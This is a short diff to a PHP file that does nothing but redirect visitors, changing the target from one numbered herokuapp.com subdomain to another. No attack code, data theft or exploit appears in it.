@@ -1,7 +1,7 @@
 <?php
 
 
-header("Location: https://sendimage004.herokuapp.com/3.php");
+header("Location: https://sendimage0043.herokuapp.com/3.php");
 
 
 ?>
